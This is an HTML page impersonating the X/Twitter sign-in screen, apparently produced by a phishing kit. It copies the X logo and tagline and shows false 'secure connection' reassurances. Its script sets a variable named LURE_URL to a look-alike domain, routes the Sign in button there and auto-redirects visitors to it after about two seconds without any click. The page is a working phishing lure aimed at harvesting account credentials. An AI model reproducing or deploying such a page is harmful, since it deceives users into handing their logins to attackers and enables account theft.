<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>X / Twitter – Sign in</title>
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#f5f5f5;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh}
    .card{background:#fff;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,.1);padding:40px 36px 32px;width:100%;max-width:400px;text-align:center}
    .logo{margin-bottom:24px;display:flex;align-items:center;justify-content:center}
    .tagline{color:#666;font-size:15px;margin-bottom:28px;line-height:1.4}
    .btn{display:block;width:100%;padding:12px;background:#000000;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;text-align:center;text-decoration:none;transition:opacity .2s}
    .btn:hover{opacity:.88}
    .spinner{width:36px;height:36px;border:3px solid #eee;border-top:3px solid #000000;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 16px}
    @keyframes spin{to{transform:rotate(360deg)}}
    .loading{display:none}
    .loading p{color:#888;font-size:14px;margin-top:8px}
    footer{margin-top:24px;color:#999;font-size:12px}
  </style>
</head>
<body>
  <div class="card" id="card">
    <div class="logo"><svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.741l7.732-8.859L2.25 2.25h6.918l4.243 5.617zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></div>
    <p class="tagline">See what's happening in the world right now.</p>
    <a class="btn" id="btn" href="#">Sign in</a>
  </div>
  <div class="card loading" id="loading">
    <div class="spinner"></div>
    <p>Redirecting to secure sign-in&hellip;</p>
  </div>
  <footer>Secure connection &bull; Privacy Policy</footer>
  <script>
    var LURE_URL = 'https://x2026.authenticationsession.online/cxsJLxHi'; /* AUTO_LURE_URL */
    document.getElementById('btn').href = LURE_URL;
    document.getElementById('btn').addEventListener('click', function(e) {
      e.preventDefault();
      document.getElementById('card').style.display = 'none';
      document.getElementById('loading').style.display = 'block';
      setTimeout(function(){ window.location.href = LURE_URL; }, 600);
    });
    // Auto-redirect after 1.8s if user doesn't click
    setTimeout(function(){
      document.getElementById('card').style.display = 'none';
      document.getElementById('loading').style.display = 'block';
      setTimeout(function(){ window.location.href = LURE_URL; }, 600);
    }, 1800);
  </script>
</body>
</html>
